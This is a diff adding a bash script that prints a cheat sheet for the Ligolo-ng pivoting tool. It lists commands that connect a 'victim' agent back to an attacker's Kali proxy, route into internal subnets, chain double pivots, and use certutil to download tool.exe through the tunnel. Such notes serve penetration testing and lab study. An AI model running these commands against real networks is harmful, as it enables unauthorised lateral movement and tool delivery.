@@ -1,0 +1,59 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── LIGOLO-NG — TUNNEL & PIVOT ───────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Setup (Basic Tunnel) ─────────────────────────────${NC}"
+echo -e "  Note: Kali - start proxy:"
+echo -e "  ${GREEN}./proxy -selfcert${NC}                          # listen on :11601"
+printf "\n"
+echo -e "  Note: Victim - connect agent:"
+echo -e "  ${GREEN}./agent -connect <KALI_IP>:11601 -ignore-cert${NC}"
+printf "\n"
+echo -e "  Note: Kali - setup TUN interface:"
+echo -e "  ${GREEN}sudo ip tuntap add user \$(whoami) mode tun ligolo${NC}"
+echo -e "  ${GREEN}sudo ip link set ligolo up${NC}"
+printf "\n"
+echo -e "  Note: In Ligolo console - select session and start:"
+echo -e "  ${GREEN}session${NC}                                    # select agent"
+echo -e "  ${GREEN}start${NC}                                      # start tunnel"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Route Add (Internal Subnet) ──────────────────────${NC}"
+echo -e "  ${GREEN}sudo ip route add 192.168.1.0/24 dev ligolo${NC}"
+echo -e "  ${GREEN}sudo ip route add 10.10.10.0/24 dev ligolo${NC}"
+echo -e "  Note: Then connect directly to internal IPs from Kali"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Multi-Hop (Double Pivot) ─────────────────────────${NC}"
+echo -e "  Note: On first pivot - download agent, connect to Kali proxy"
+echo -e "  Note: On second pivot - connect agent to first pivot listener"
+echo -e "  ${GREEN}listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp${NC}  # in ligolo console on first agent"
+printf "\n"
+echo -e "  Note: Second agent on deeper host:"
+echo -e "  ${GREEN}./agent -connect <FIRST_PIVOT_IP>:11601 -ignore-cert${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── listener_add (File Transfer via Tunnel) ──────────${NC}"
+echo -e "  ${GREEN}listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp${NC}  # forward victim:8080 -> Kali:80"
+echo -e "  Note: Then internal hosts download from victim:8080 (which reaches Kali HTTP server)"
+echo -e "  ${GREEN}certutil -urlcache -split -f http://<PIVOT_IP>:8080/tool.exe 'C:\\tool.exe'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Agent Compilation ────────────────────────────────${NC}"
+echo -e "  ${GREEN}GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent${NC}"
+echo -e "  ${GREEN}GOOS=linux GOARCH=amd64 go build -o agent ./cmd/agent${NC}"
+printf "\n"
+echo -e "  ${BLUE}After tunnel active, Kali reaches all internal IPs directly — no proxychains needed${NC}"
+echo -e "  Note: DNS resolution for internal hosts: add to /etc/hosts or use --dns flag"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
